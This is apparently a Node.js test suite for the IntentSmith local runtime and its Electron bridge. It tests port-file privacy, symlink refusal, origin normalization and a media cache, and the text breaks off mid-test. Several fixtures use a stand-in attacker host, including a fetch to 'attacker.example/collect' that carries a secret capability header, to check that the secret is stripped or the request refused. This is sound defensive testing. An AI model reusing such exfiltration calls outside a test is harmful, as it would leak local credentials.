#!/usr/bin/env node
// ══════════════════════════════════════════════════════════════════════════════
// IntentSmith — local runtime UX and transport tests
// ══════════════════════════════════════════════════════════════════════════════
//
// Tests:
//   - Tiered rate limit classification (classifyEndpoint)
//   - Dynamic port and local capability handling
//   - Local media ownership
//   - Multi-session infrastructure
//
// Run: node tests/upgrade-ux-v125.test.js
// ══════════════════════════════════════════════════════════════════════════════

import { suite, test, testAsync, assert, assertEqual, assertThrows, summary } from './harness.js';
import { createRequire } from 'node:module';
import { config } from '../src/config.js';

const require = createRequire(import.meta.url);
const {
  LEGACY_LOCAL_CAPABILITY_HEADER,
  installLegacyLocalFetch,
} = require(
  '../c3-ide/applications/electron/c3-local-http-bootstrap.js',
);
const {
  normalizeLocalAccess: normalizeNodeLocalAccess,
  readLocalAccess: readNodeLocalAccess,
} = require('../c3-ide/applications/electron/c3-local-access.js');
const {
  installOnSession: installLocalOriginNormalizerOnSession,
  normalizeOpaqueStudioRequest,
} = require('../c3-ide/applications/electron/c3-local-origin-normalizer.js');
const {
  createLegacyLocalObjectUrlCache,
} = require('../c3-ide/shared/legacy-local-object-url-cache.js');

// SECTION 1: Tiered Rate Limiting
// ═══════════════════════════════════════════════════════════════════════════════

suite('Rate Limiting — localhost disabled, network tiered');

test('config has tiered rate limit values', () => {
  const rl = config.server.rateLimit;
  assert(rl.readMaxRequests > 0, 'readMaxRequests should be positive');
  assert(rl.writeMaxRequests > 0, 'writeMaxRequests should be positive');
  assert(rl.readMaxRequests > rl.writeMaxRequests, 'read limit should be higher than write');
  assertEqual(rl.readMaxRequests, 600, 'read should be 600');
  assertEqual(rl.writeMaxRequests, 120, 'write should be 120');
});

test('config has trustProxy flag', () => {
  assert('trustProxy' in config.server.rateLimit, 'trustProxy should exist');
  assertEqual(typeof config.server.rateLimit.trustProxy, 'boolean');
});

test('config windowMs is 60000', () => {
  assertEqual(config.server.rateLimit.windowMs, 60000);
});

test('default host is 127.0.0.1 → rate limit disabled on localhost', () => {
  // Default config binds to 127.0.0.1 — rate limiting should be OFF
  const host = config.server.host;
  const isLocalhost = host === '127.0.0.1' || host === 'localhost';
  assert(isLocalhost, `Default host should be localhost, got ${host}`);
  // Rate limiting is disabled for localhost (like Ollama)
});

// ═══════════════════════════════════════════════════════════════════════════════
// SECTION 8: Dynamic Port Allocation
// ═══════════════════════════════════════════════════════════════════════════════

import fs from 'fs';
import path from 'path';
import os from 'os';
import { spawnSync } from 'child_process';
import {
  buildServerPortPayload,
  writePrivatePortFile,
} from '../src/server-port-file.js';

suite('Dynamic Port — config + port file');

function probeServerConfig(env) {
  const configUrl = new URL('../src/config.js', import.meta.url).href;
  const probe = spawnSync(
    process.execPath,
    [
      '--input-type=module',
      '--eval',
      `const { config } = await import(${JSON.stringify(configUrl)});`
        + 'process.stdout.write(JSON.stringify({'
        + 'port: config.server.port, portFile: config.server.portFile'
        + '}));',
    ],
    {
      encoding: 'utf8',
      env: {
        LANG: 'C',
        LC_ALL: 'C',
        ...env,
      },
      timeout: 5_000,
    },
  );
  assertEqual(probe.error, undefined, String(probe.error));
  assertEqual(probe.status, 0, probe.stderr || probe.stdout);
  return JSON.parse(probe.stdout);
}

test('config port honors C3_PORT or uses dynamic port 0', () => {
  const expected = Number.parseInt(process.env.C3_PORT || '0', 10);
  assertEqual(config.server.port, expected);
});

test('config portFile honors the isolated override or default', () => {
  assert(typeof config.server.portFile === 'string', 'portFile should be a string');
  assert(config.server.portFile.length > 0, 'portFile should not be empty');
  const expected = process.env.C3_PORT_FILE || path.join(os.homedir(), '.c3', 'port');
  assertEqual(config.server.portFile, expected);
});

test('portFile defaults to ~/.c3/port when no override exists', () => {
  const isolatedHome = fs.mkdtempSync(path.join(os.tmpdir(), 'c3-port-default-'));
  try {
    const probed = probeServerConfig({ HOME: isolatedHome });
    assertEqual(probed.port, 0);
    assertEqual(probed.portFile, path.join(isolatedHome, '.c3', 'port'));
  } finally {
    fs.rmSync(isolatedHome, { recursive: true, force: true });
  }
});

test('server config honors explicit port and port-file overrides', () => {
  const isolatedHome = fs.mkdtempSync(path.join(os.tmpdir(), 'c3-port-override-'));
  try {
    const overridePath = path.join(isolatedHome, 'runtime', 'override.port');
    const probed = probeServerConfig({
      HOME: isolatedHome,
      C3_PORT: '45678',
      C3_PORT_FILE: overridePath,
    });
    assertEqual(probed.port, 45678);
    assertEqual(probed.portFile, overridePath);
  } finally {
    fs.rmSync(isolatedHome, { recursive: true, force: true });
  }
});

test('port file write/read roundtrip is private for new and stale files', () => {
  const tmpFile = path.join(os.tmpdir(), `c3-test-port-${process.pid}`);
  const portData = { port: 54321, host: '127.0.0.1', pid: process.pid, started: new Date().toISOString() };

  try {
    writePrivatePortFile(tmpFile, portData);
    let read = JSON.parse(fs.readFileSync(tmpFile, 'utf-8'));
    assertEqual(read.port, 54321);
    assertEqual(read.host, '127.0.0.1');
    assertEqual(read.pid, process.pid);
    assertEqual(fs.lstatSync(tmpFile).mode & 0o777, 0o600);

    fs.chmodSync(tmpFile, 0o644);
    writePrivatePortFile(tmpFile, { ...portData, port: 54322 });
    read = JSON.parse(fs.readFileSync(tmpFile, 'utf-8'));
    assertEqual(read.port, 54322);
    assertEqual(fs.lstatSync(tmpFile).mode & 0o777, 0o600);
  } finally {
    if (fs.existsSync(tmpFile)) fs.unlinkSync(tmpFile);
  }
});

test('port payload capabilities are explicit and independently validated', () => {
  const base = {
    port: 54321,
    host: '127.0.0.1',
    pid: process.pid,
    started: '2026-07-30T00:00:00.000Z',
  };
  const production = buildServerPortPayload(base);
  assertEqual('testRunNonce' in production, false);
  assertEqual('localCapability' in production, false);

  const nonce = 'owned-server-capability-0000000001';
  const attested = buildServerPortPayload(base, nonce);
  assertEqual(attested.testRunNonce, nonce);
  const localCapability = 'C'.repeat(43);
  const browserAuthorized = buildServerPortPayload(
    base,
    nonce,
    localCapability,
  );
  assertEqual(browserAuthorized.testRunNonce, nonce);
  assertEqual(browserAuthorized.localCapability, localCapability);
  assertThrows(
    () => buildServerPortPayload(base, 'short'),
    'Short test server capability must fail closed',
  );
  assertThrows(
    () => buildServerPortPayload(base, `${'a'.repeat(31)}!`),
    'Unsafe test server capability must fail closed',
  );
  assertThrows(
    () => buildServerPortPayload(base, nonce, 'short'),
    'Short local browser capability must fail closed',
  );
});

test('server wires the test capability after resolving the bound port', () => {
  const serverSource = fs.readFileSync(
    new URL('../src/server.js', import.meta.url),
    'utf8',
  );
  const assignedPortIndex = serverSource.indexOf(
    'const assignedPort = server.address().port;',
  );
  const payloadIndex = serverSource.indexOf(
    'buildServerPortPayload(',
    assignedPortIndex,
  );
  const nonceIndex = serverSource.indexOf(
    'process.env.INTENTSMITH_TEST_SERVER_NONCE',
    payloadIndex,
  );
  const localCapabilityIndex = serverSource.indexOf(
    'legacyLocalCapability',
    nonceIndex,
  );

  assert(assignedPortIndex >= 0, 'server must resolve its actual bound port');
  assert(
    payloadIndex > assignedPortIndex,
    'server must build the port payload after resolving its bound port',
  );
  assert(
    nonceIndex > payloadIndex,
    'server must pass the private test capability into the port payload',
  );
  assert(
    localCapabilityIndex > nonceIndex,
    'server must pass the local browser capability into the port payload',
  );
});

test('private port file writer refuses a symlink without changing its target', () => {
  const target = path.join(os.tmpdir(), `c3-test-port-target-${process.pid}`);
  const link = path.join(os.tmpdir(), `c3-test-port-link-${process.pid}`);
  try {
    fs.writeFileSync(target, 'unchanged', { encoding: 'utf8', mode: 0o600 });
    fs.symlinkSync(target, link);
    let rejected = false;
    try {
      writePrivatePortFile(link, {
        port: 54321,
        host: '127.0.0.1',
        pid: process.pid,
        started: new Date().toISOString(),
      });
    } catch (error) {
      rejected = /non-symlink/.test(error.message);
    }
    assert(rejected, 'port-file symlink must be rejected');
    assertEqual(fs.readFileSync(target, 'utf8'), 'unchanged');
  } finally {
    if (fs.existsSync(link)) fs.unlinkSync(link);
    if (fs.existsSync(target)) fs.unlinkSync(target);
  }
});

test('port file cleanup on missing file does not crash', () => {
  const fakePath = path.join(os.tmpdir(), 'c3-nonexistent-port-file');
  // Should not throw
  try {
    if (fs.existsSync(fakePath)) fs.unlinkSync(fakePath);
  } catch { /* expected */ }
});

await testAsync('port 0 is valid for dynamic allocation', async () => {
  // Node.js net.Server.listen(0) binds to a random free port
  const net = await import('net');
  const srv = net.default.createServer();
  await new Promise((resolve, reject) => {
    srv.listen(0, '127.0.0.1', () => {
      const port = srv.address().port;
      assert(port > 0, `assigned port should be > 0, got ${port}`);
      assert(port < 65536, `assigned port should be < 65536, got ${port}`);
      srv.close(resolve);
    });
    srv.on('error', reject);
  });
});

test('FE _backendBase discovery pattern (window.electronC3)', () => {
  // Simulate the FE discovery pattern used in chat-panel-module.js
  const globalObj = {};

  // Case 1: electronC3 available
  globalObj.electronC3 = { getBackendUrl: () => 'http://127.0.0.1:45678' };
  const discovered = (function(win) {
    try {
      if (win.electronC3) {
        var url = win.electronC3.getBackendUrl();
        if (url) return url;
      }
    } catch(e) {}
    return 'http://127.0.0.1:3335';
  })(globalObj);
  assertEqual(discovered, 'http://127.0.0.1:45678');

  // Case 2: electronC3 not available → fallback
  const fallback = (function(win) {
    try {
      if (win.electronC3) {
        var url = win.electronC3.getBackendUrl();
        if (url) return url;
      }
    } catch(e) {}
    return 'http://127.0.0.1:3335';
  })({});
  assertEqual(fallback, 'http://127.0.0.1:3335');

  // Case 3: electronC3 returns null → fallback
  globalObj.electronC3 = { getBackendUrl: () => null };
  const nullCase = (function(win) {
    try {
      if (win.electronC3) {
        var url = win.electronC3.getBackendUrl();
        if (url) return url;
      }
    } catch(e) {}
    return 'http://127.0.0.1:3335';
  })(globalObj);
  assertEqual(nullCase, 'http://127.0.0.1:3335');
});

function createLocalFetchScope(getLocalAccess) {
  const calls = [];
  const scope = {
    Headers,
    Request,
    URL,
    location: { href: 'file:///opt/intentsmith/index.html' },
    electronC3: { getLocalAccess },
    fetch: async function nativeFetch(...args) {
      calls.push(args);
      return { ok: true, status: 200 };
    },
  };
  return { calls, scope };
}

await testAsync('Electron local fetch authorizes only the exact backend origin', async () => {
  const capability = 'A'.repeat(43);
  let metadataReads = 0;
  const { calls, scope } = createLocalFetchScope(() => {
    metadataReads++;
    return {
      backendUrl: 'http://127.0.0.1:45678',
      localCapability: capability,
    };
  });

  assertEqual(installLegacyLocalFetch(scope), true);
  assertEqual(installLegacyLocalFetch(scope), false, 'bootstrap must be idempotent');

  const controller = new AbortController();
  await scope.fetch('/api/settings', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      [LEGACY_LOCAL_CAPABILITY_HEADER]: 'caller-controlled-value',
    },
    body: '{"enabled":true}',
    signal: controller.signal,
  });

  assertEqual(metadataReads, 1, 'one request must use one atomic metadata snapshot');
  assertEqual(calls.length, 1);
  const request = calls[0][0];
  assert(request instanceof Request, 'authorized fetch must use a Request');
  assertEqual(request.url, 'http://127.0.0.1:45678/api/settings');
  assertEqual(request.method, 'POST');
  assertEqual(request.headers.get('content-type'), 'application/json');
  assertEqual(
    request.headers.get(LEGACY_LOCAL_CAPABILITY_HEADER),
    capability,
    'current private capability must overwrite caller input',
  );
  assertEqual(request.redirect, 'error', 'local redirects must not forward capability');
  assertEqual(await request.text(), '{"enabled":true}');
  assertEqual(request.signal.aborted, false);
  controller.abort();
  assertEqual(request.signal.aborted, true, 'authorized request must retain abort propagation');
});

await testAsync('Electron local fetch preserves Request inputs and strips foreign capability headers', async () => {
  const capability = 'B'.repeat(43);
  const { calls, scope } = createLocalFetchScope(() => ({
    backendUrl: 'http://127.0.0.1:45678',
    localCapability: capability,
  }));
  installLegacyLocalFetch(scope);

  const input = new Request(
    'http://127.0.0.1:45678/chat',
    {
      method: 'POST',
      headers: { 'X-Existing': 'preserved' },
      body: 'request-body',
    },
  );
  await scope.fetch(input);
  const authorized = calls[0][0];
  assertEqual(authorized.method, 'POST');
  assertEqual(authorized.headers.get('x-existing'), 'preserved');
  assertEqual(
    authorized.headers.get(LEGACY_LOCAL_CAPABILITY_HEADER),
    capability,
  );
  assertEqual(await authorized.text(), 'request-body');

  await scope.fetch('https://attacker.example/collect', {
    headers: {
      [LEGACY_LOCAL_CAPABILITY_HEADER]: capability,
      'X-Safe': 'kept',
    },
  });
  const foreign = calls[1][0];
  assert(foreign instanceof Request, 'foreign secret stripping must use a sanitized Request');
  assertEqual(foreign.url, 'https://attacker.example/collect');
  assertEqual(foreign.headers.has(LEGACY_LOCAL_CAPABILITY_HEADER), false);
  assertEqual(foreign.headers.get('x-safe'), 'kept');
});

await testAsync('Electron local fetch never authorizes lookalike local origins', async () => {
  const capability = 'C'.repeat(43);
  const { calls, scope } = createLocalFetchScope(() => ({
    backendUrl: 'http://127.0.0.1:45678',
    localCapability: capability,
  }));
  installLegacyLocalFetch(scope);

  const lookalikes = [
    'http://localhost:45678/api/system/info',
    'http://127.0.0.1:45679/api/system/info',
    'https://127.0.0.1:45678/api/system/info',
    'https://attacker.example/?next=http://127.0.0.1:45678',
  ];
  for (const target of lookalikes) {
    await scope.fetch(target);
  }

  assertEqual(calls.length, lookalikes.length);
  for (let index = 0; index < lookalikes.length; index++) {
    assertEqual(calls[index][0], lookalikes[index]);
    assertEqual(calls[index][1], undefined);
  }
});

await testAsync('Electron local fetch fails closed for relative API calls without valid metadata', async () => {
  for (const metadata of [
    null,
    {
      backendUrl: 'http://127.0.0.1:45678',
      localCapability: 'too-short',
    },
    {
      backendUrl: 'https://127.0.0.1:45678',
      localCapability: 'D'.repeat(43),
    },
  ]) {
    let metadataReads = 0;
    const { calls, scope } = createLocalFetchScope(() => {
      metadataReads++;
      return metadata;
    });
    installLegacyLocalFetch(scope);
    let rejected = false;
    try {
      await scope.fetch('/api/system/info');
    } catch (error) {
      rejected = error instanceof TypeError
        && /capability is unavailable/.test(error.message);
    }
    assert(rejected, 'relative API request must reject without valid private metadata');
    assertEqual(metadataReads, 1);
    assertEqual(calls.length, 0, 'invalid metadata must not reach native fetch');
  }
});

await testAsync('Electron local fetch canonicalizes the explicit default HTTP port', async () => {
  const capability = 'E'.repeat(43);
  const { calls, scope } = createLocalFetchScope(() => ({
    backendUrl: 'http://127.0.0.1:80',
    localCapability: capability,
  }));
  installLegacyLocalFetch(scope);
  await scope.fetch('http://127.0.0.1/api/health');
  assertEqual(calls.length, 1);
  assertEqual(
    calls[0][0].headers.get(LEGACY_LOCAL_CAPABILITY_HEADER),
    capability,
  );
});

test('Electron Node-side local access reader accepts only a private regular port file', () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'c3-local-access-'));
  const portFile = path.join(root, 'port');
  const symlink = path.join(root, 'port-link');
  const capability = 'F'.repeat(43);
  const payload = JSON.stringify({
    host: '127.0.0.1',
    port: 45678,
    localCapability: capability,
  });
  try {
    fs.writeFileSync(portFile, payload, { encoding: 'utf8', mode: 0o600 });
    fs.chmodSync(portFile, 0o600);
    assertEqual(readNodeLocalAccess({ portFile })?.backendUrl, 'http://127.0.0.1:45678');
    assertEqual(readNodeLocalAccess({ portFile })?.localCapability, capability);

    fs.chmodSync(portFile, 0o644);
    assertEqual(readNodeLocalAccess({ portFile }), null);
    fs.chmodSync(portFile, 0o600);

    fs.symlinkSync(portFile, symlink);
    assertEqual(readNodeLocalAccess({ portFile: symlink }), null);
    assertEqual(readNodeLocalAccess({ portFile: 'relative-port-file' }), null);
    assertEqual(
      normalizeNodeLocalAccess({ host: 'attacker.example', port: 45678, localCapability: capability }),
      null,
    );
  } finally {
    fs.rmSync(root, { recursive: true, force: true });
  }
});

function createOpaqueStudioFrame(overrides = {}) {
  const frame = {
    parent: null,
    origin: 'file://',
    url: 'file:///opt/intentsmith/lib/frontend/index.html?port=45678',
    isDestroyed: () => false,
    ...overrides,
  };
  frame.top = Object.hasOwn(overrides, 'top') ? overrides.top : frame;
  return frame;
}

function createOpaqueStudioRequest(capability, overrides = {}) {
  return {
    url: 'http://127.0.0.1:45678/api/settings',
    method: 'GET',
    resourceType: 'xhr',
    frame: createOpaqueStudioFrame(),
    requestHeaders: {
      'Sec-Fetch-Site': 'cross-site',
      [LEGACY_LOCAL_CAPABILITY_HEADER]: capability,
    },
    ...overrides,
  };
}

function normalizeStudioFixture(details, capability) {
  return normalizeOpaqueStudioRequest(details, {
    expectedFrontendPath: '/opt/intentsmith/lib/frontend/index.html',
    readAccess: () => ({
      backendUrl: 'http://127.0.0.1:45678',
      localCapability: capability,
    }),
  });
}

test('Electron main normalizes only the exact capability-authorized opaque Studio request', () => {
  const capability = 'G'.repeat(43);
  const details = createOpaqueStudioRequest(capability);
  const originalHeaders = { ...details.requestHeaders };
  const normalized = normalizeStudioFixture(details, capability);
  assert(normalized, 'exact opaque Studio request must be normalized');
  assertEqual(normalized.Origin, 'null');
  assertEqual(normalized['Sec-Fetch-Site'], 'cross-site');
  assertEqual(normalized[LEGACY_LOCAL_CAPABILITY_HEADER], capability);
  assertEqual(Object.hasOwn(details.requestHeaders, 'Origin'), false);
  assertEqual(JSON.stringify(details.requestHeaders), JSON.stringify(originalHeaders));

  const nullOriginFrame = createOpaqueStudioRequest(capability, {
    frame: createOpaqueStudioFrame({ origin: 'null' }),
  });
  assertEqual(normalizeStudioFixture(nullOriginFrame, capability)?.Origin, 'null');
});

test('Electron main normalizes only an exact declared opaque Studio preflight', () => {
  const capability = 'P'.repeat(43);
  const preflight = createOpaqueStudioRequest(capability, {
    method: 'OPTIONS',
    requestHeaders: {
      'Sec-Fetch-Site': 'cross-site',
      'Access-Control-Request-Method': 'PATCH',
      'Access-Control-Request-Headers':
        `content-type, ${LEGACY_LOCAL_CAPABILITY_HEADER.toLowerCase()}`,
    },
  });
  const normalized = normalizeStudioFixture(preflight, capability);
  assertEqual(normalized?.Origin, 'null');
  assertEqual(
    Object.hasOwn(normalized, LEGACY_LOCAL_CAPABILITY_HEADER),
    false,
  );

  for (const requestHeaders of [
    {
      'Sec-Fetch-Site': 'cross-site',
      'Access-Control-Request-Method': 'PATCH',
      'Access-Control-Request-Headers': 'content-type',
    },
    {
      'Sec-Fetch-Site': 'cross-site',
      'Access-Control-Request-Method': 'CONNECT',
      'Access-Control-Request-Headers': LEGACY_LOCAL_CAPABILITY_HEADER,
    },
    {
      'Sec-Fetch-Site': 'cross-site',
      'Access-Control-Request-Method': 'PATCH',
      'Access-Control-Request-Headers':
        `${LEGACY_LOCAL_CAPABILITY_HEADER}, authorization`,
    },
    {
      'Sec-Fetch-Site': 'cross-site',
      'Access-Control-Request-Method': 'PATCH',
      'Access-Control-Request-Headers':
        `${LEGACY_LOCAL_CAPABILITY_HEADER}, ${LEGACY_LOCAL_CAPABILITY_HEADER}`,
    },
    {
      'Sec-Fetch-Site': 'cross-site',
      'Access-Control-Request-Method': 'PATCH',
      'Access-Control-Request-Headers': LEGACY_LOCAL_CAPABILITY_HEADER,
      [LEGACY_LOCAL_CAPABILITY_HEADER]: capability,
    },
  ]) {
    assertEqual(
      normalizeStudioFixture(
        createOpaqueStudioRequest(capability, {
          method: 'OPTIONS',
          requestHeaders,
        }),
        capability,
      ),
      null,
    );
  }
});

test('Electron main origin normalization fails closed for every mismatched boundary input', () => {
  const capability = 'H'.repeat(43);
  const cases = [
    createOpaqueStudioRequest(capability, {
      requestHeaders: { 'Sec-Fetch-Site': 'cross-site' },
    }),
    createOpaqueStudioRequest(capability, {
      requestHeaders: {
        'Sec-Fetch-Site': 'cross-site',
        [LEGACY_LOCAL_CAPABILITY_HEADER]: 'I'.repeat(43),
      },
    }),
    createOpaqueStudioRequest(capability, {
      requestHeaders: {
        'Sec-Fetch-Site': 'cross-site',
        [LEGACY_LOCAL_CAPABILITY_HEADER]: capability,
        [LEGACY_LOCAL_CAPABILITY_HEADER.toLowerCase()]: capability,
      },
    }),
    createOpaqueStudioRequest(capability, {
      requestHeaders: {
        Origin: 'http://attacker.example',
        'Sec-Fetch-Site': 'cross-site',
        [LEGACY_LOCAL_CAPABILITY_HEADER]: capability,
      },
    }),
    createOpaqueStudioRequest(capability, { url: 'http://localhost:45678/api/settings' }),
    createOpaqueStudioRequest(capability, { url: 'http://127.0.0.1:45679/api/settings' }),
    createOpaqueStudioRequest(capability, { url: 'https://127.0.0.1:45678/api/settings' }),
    createOpaqueStudioRequest(capability, { url: 'http://user@127.0.0.1:45678/api/settings' }),
    createOpaqueStudioRequest(capability, { url: 'http://127.0.0.1:45678/api/settings#fragment' }),
    createOpaqueStudioRequest(capability, { url: 'http://127.0.0.1:45678/apiary' }),
    createOpaqueStudioRequest(capability, { method: 'TRACE' }),
    createOpaqueStudioRequest(capability, { resourceType: 'image' }),
    createOpaqueStudioRequest(capability, {
      requestHeaders: {
        [LEGACY_LOCAL_CAPABILITY_HEADER]: capability,
      },
    }),
    createOpaqueStudioRequest(capability, {
      frame: createOpaqueStudioFrame({ parent: {} }),
    }),
    createOpaqueStudioRequest(capability, {
      frame: createOpaqueStudioFrame({ top: {} }),
    }),
    createOpaqueStudioRequest(capability, {
      frame: createOpaqueStudioFrame({ origin: 'http://attacker.example' }),
    }),
    createOpaqueStudioRequest(capability, {
      frame: createOpaqueStudioFrame({ url: 'file:///opt/other/index.html' }),
    }),
    createOpaqueStudioRequest(capability, {
      frame: createOpaqueStudioFrame({ isDestroyed: () => true }),
    }),
  ];

  for (const details of cases) {
    assertEqual(
      normalizeStudioFixture(details, capability),
      null,
      `mismatched request must not be normalized: ${details.method} ${details.url}`,
    );
  }
  assertEqual(
    normalizeOpaqueStudioRequest(createOpaqueStudioRequest(capability), {
      expectedFrontendPath: '/opt/intentsmith/lib/frontend/index.html',
      readAccess: () => null,
    }),
    null,
  );
});

test('Electron main owns one bounded onBeforeSendHeaders normalizer', () => {
  const capability = 'J'.repeat(43);
  let filter;
  let listener;
  const fakeSession = {
    webRequest: {
      onBeforeSendHeaders(nextFilter, nextListener) {
        filter = nextFilter;
        listener = nextListener;
      },
    },
  };
  assertThrows(
    () => installLocalOriginNormalizerOnSession({
      webRequest: {
        onBeforeSendHeaders() {
          throw new Error('synthetic registration failure');
        },
      },
    }),
    /synthetic registration failure/,
  );
  assertEqual(installLocalOriginNormalizerOnSession(fakeSession), true);
  assertEqual(installLocalOriginNormalizerOnSession(fakeSession), false);
  assertEqual(filter.urls.length, 2);
  assertEqual(typeof listener, 'function');

  const priorPortFile = process.env.C3_PORT_FILE;
  const priorTheiaProjectPath = process.env.THEIA_APP_PROJECT_PATH;
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'normalizer-session-'));
  const portFile = path.join(root, 'port');
  try {
    fs.writeFileSync(portFile, JSON.stringify({
      host: '127.0.0.1',
      port: 45678,
      localCapability: capability,
    }), { mode: 0o600 });
    fs.chmodSync(portFile, 0o600);
    process.env.C3_PORT_FILE = portFile;
    process.env.THEIA_APP_PROJECT_PATH = '/opt/intentsmith';
    let callbackResult;
    listener(createOpaqueStudioRequest(capability), result => {
      callbackResult = result;
    });
    assertEqual(callbackResult.requestHeaders.Origin, 'null');
  } finally {
    if (priorPortFile === undefined) delete process.env.C3_PORT_FILE;
    else process.env.C3_PORT_FILE = priorPortFile;
    if (priorTheiaProjectPath === undefined) delete process.env.THEIA_APP_PROJECT_PATH;
    else process.env.THEIA_APP_PROJECT_PATH = priorTheiaProjectPath;
    fs.rmSync(root, { recursive: true, force: true });
  }
});

// ═══════════════════════════════════════════════════════════════════════════════
// SECTION 8b: Legacy local media object-URL ownership
// ═══════════════════════════════════════════════════════════════════════════════

function createObjectUrlCacheTestHarness(options = {}) {
  let fetchCalls = 0;
  const created = [];
  const revoked = [];
  const cache = createLegacyLocalObjectUrlCache({
    fetchImpl: options.fetchImpl || (async target => {
      fetchCalls++;
      return {
        ok: true,
        blob: async () => ({ target }),
      };
    }),
    createObjectURL: options.createObjectURL || (blob => {
      const objectUrl = `blob:test-${created.length + 1}:${blob.target}`;
      created.push(objectUrl);
      return objectUrl;
    }),
    revokeObjectURL: options.revokeObjectURL || (objectUrl => {
      revoked.push(objectUrl);
    }),
    maxEntries: options.maxEntries ?? 24,
    maxPending: options.maxPending ?? 64,
    maxFailures: options.maxFailures ?? 256,
    failureTtlMs: options.failureTtlMs ?? 60_000,
    now: options.now ?? Date.now,
  });
  return {
    cache,
    created,
    fetchCalls: () => fetchCalls,
    revoked,
  };
}

await testAsync('media object URL cache deduplicates loads and revokes exact entries', async () => {
  const target = '/api/media/output?id=1&filename=one.png';
  const harness = createObjectUrlCacheTestHarness();
  const first = await harness.cache.load(target);
  const second = await harness.cache.load(target);

  assertEqual(first, second);
  assertEqual(harness.fetchCalls(), 1, 'cached media must not fetch twice');
  assertEqual(harness.cache.peek(target), first);
  assertEqual(harness.cache.invalidate(target), true);
  assertEqual(harness.cache.peek(target), null);
  assertEqual(harness.revoked.length, 1);
  assertEqual(harness.revoked[0], first);
});

await testAsync('media invalidation aborts a pending load and blocks late reinsertion', async () => {
  const target = '/api/media/output?id=2&filename=late.png';
  let resolveFetch;
  let capturedSignal = null;
  const harness = createObjectUrlCacheTestHarness({
    fetchImpl: (_target, options) => {
      capturedSignal = options.signal;
      return new Promise(resolve => {
        resolveFetch = resolve;
      });
    },
  });

  const pendingLoad = harness.cache.load(target);
  await Promise.resolve();
  assert(capturedSignal, 'pending load must receive an abort signal');
  assertEqual(harness.cache.invalidate(target), true);
  assertEqual(capturedSignal.aborted, true);
  resolveFetch({
    ok: true,
    blob: async () => ({ target }),
  });

  assertEqual(await pendingLoad, null);
  assertEqual(harness.created.length, 0, 'late response must not create an object URL');
  assertEqual(harness.cache.peek(target), null);
  assertEqual(harness.cache.stats().pending, 0);
  assertEqual(harness.cache.stats().failed, 0);
});

await testAsync('media invalidation before the fetch microtask prevents the request', async () => {
  const target = '/api/media/output?id=2&filename=cancelled-before-fetch.png';
  let fetchCalls = 0;
  const harness = createObjectUrlCacheTestHarness({
    fetchImpl: async () => {
      fetchCalls++;
      return {
        ok: true,
        blob: async () => ({ target }),
      };
    },
  });

  const pendingLoad = harness.cache.load(target);
  assertEqual(harness.cache.invalidate(target), true);
  assertEqual(await pendingLoad, null);
  assertEqual(fetchCalls, 0, 'synchronous invalidation must prevent the fetch call');
  assertEqual(harness.created.length, 0);
  assertEqual(harness.cache.stats().pending, 0);
  assertEqual(harness.cache.stats().failed, 0);
});

await testAsync('media object URL cache bounds repeated failures across every load phase', async () => {
  const scenarios = [
    {
      name: 'fetch rejection',
      fetchImpl: async (_target, _options, countAttempt) => {
        countAttempt();
        throw new Error('fetch failed');
      },
    },
    {
      name: 'HTTP rejection',
      fetchImpl: async (_target, _options, countAttempt) => {
        countAttempt();
        return { ok: false, status: 503 };
      },
    },
    {
      name: 'blob rejection',
      fetchImpl: async (_target, _options, countAttempt) => {
        countAttempt();
        return {
          ok: true,
          blob: async () => { throw new Error('blob failed'); },
        };
      },
    },
    {
      name: 'object URL rejection',
      fetchImpl: async (target, _options, countAttempt) => {
        countAttempt();
        return { ok: true, blob: async () => ({ target }) };
      },
      createObjectURL: () => { throw new Error('object URL failed'); },
    },
  ];

  for (const [index, scenario] of scenarios.entries()) {
    let attempts = 0;
    const target = `/api/media/output?id=failure-${index}&filename=bad.png`;
    const harness = createObjectUrlCacheTestHarness({
      fetchImpl: (requestedTarget, options) => scenario.fetchImpl(
        requestedTarget,
        options,
        () => { attempts++; },
      ),
      createObjectURL: scenario.createObjectURL,
    });

    assertEqual(await harness.cache.load(target), null, scenario.name);
    assertEqual(await harness.cache.load(target), null, scenario.name);
    assertEqual(attempts, 1, `${scenario.name} must enter a bounded cooldown`);
    assertEqual(harness.cache.stats().failed, 1, scenario.name);
  }
});

await testAsync('media failure TTL is absolute and retries at the exact deadline', async () => {
  const target = '/api/media/output?id=ttl&filename=retry.png';
  let now = 10_000;
  let attempts = 0;
  const harness = createObjectUrlCacheTestHarness({
    failureTtlMs: 60_000,
    now: () => now,
    fetchImpl: async requestedTarget => {
      attempts++;
      if (attempts === 1) return { ok: false, status: 503 };
      return { ok: true, blob: async () => ({ target: requestedTarget }) };
    },
  });

  assertEqual(await harness.cache.load(target), null);
  assertEqual(harness.cache.stats().failureTtlMs, 60_000);
  assertEqual(harness.cache.stats().maxFailures, 256);
  now += 59_999;
  assertEqual(await harness.cache.load(target), null);
  assertEqual(attempts, 1, 'negative hits must not extend or bypass the TTL');
  now += 1;
  const recovered = await harness.cache.load(target);
  assert(recovered, 'the exact TTL deadline must permit a retry');
  assertEqual(attempts, 2);
  assertEqual(harness.cache.stats().failed, 0);
});

await testAsync('media AbortError is never negative-cached', async () => {
  const target = '/api/media/output?id=abort&filename=retry.png';
  let attempts = 0;
  const harness = createObjectUrlCacheTestHarness({
    fetchImpl: async requestedTarget => {
      attempts++;
      if (attempts === 1) {
        const error = new Error('cancelled');
        error.name = 'AbortError';
        throw error;
      }
      return { ok: true, blob: async () => ({ target: requestedTarget }) };
    },
  });

  assertEqual(await harness.cache.load(target), null);
  assertEqual(harness.cache.stats().failed, 0);
  assert(await harness.cache.load(target), 'an aborted load must be immediately retryable');
  assertEqual(attempts, 2);
});

await testAsync('late failure from an invalidated owner cannot poison its replacement', async () => {
  const target = '/api/media/output?id=owner&filename=fresh.png';
  const requests = [];
  const harness = createObjectUrlCacheTestHarness({
    fetchImpl: (requestedTarget, options) => new Promise((resolve, reject) => {
      requests.push({ options, reject, requestedTarget, resolve });
    }),
  });

  const staleLoad = harness.cache.load(target);
  await Promise.resolve();
  assertEqual(requests.length, 1);
  assertEqual(harness.cache.invalidate(target), true);
  const replacementLoad = harness.cache.load(target);
  await Promise.resolve();
  assertEqual(requests.length, 2);

  requests[0].reject(new Error('late stale failure'));
  requests[1].resolve({
    ok: true,
    blob: async () => ({ target: requests[1].requestedTarget }),
  });
  assertEqual(await staleLoad, null);
